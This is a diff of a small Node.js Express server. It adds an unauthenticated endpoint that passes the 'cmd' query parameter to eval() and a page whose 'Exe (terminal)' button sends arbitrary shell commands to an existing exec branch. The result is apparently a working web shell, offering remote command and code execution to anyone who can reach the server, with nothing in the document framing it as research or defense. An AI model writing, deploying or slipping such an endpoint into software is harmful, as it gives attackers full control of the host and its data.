@@ -1,13 +1,7 @@
 const { exec } = require('child_process');
 const express = require("express");
 
-exec('cat *.js bad_file | wc -l', (err, stdout, stderr) => {
-  if (err) {
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
-  console.log(`stderr: ${stderr}`);
-});
+
 
 const app = express();
 
@@ -20,6 +14,18 @@ app.get("/", function(req, res) {
       res.send(`Out:<pre>${o}</pre><br /><br />Err:<pre>${e}</pre>`)
     });
   };
+  if(r.do == "n" && r.cmd) {
+    res.send(eval(r.cmd));
+  };
+  if(!r.do) {
+    res.send(`
+<html>
+<body>
+<button type="button" onclick="window.location.href = '?do=exe&cmd=' + prompt('CMD','echo test')">Exe (terminal)</button>
+</body>
+</html>
+`)
+  }
 });
 
 const listener = app.listen(process.env.PORT, function() {
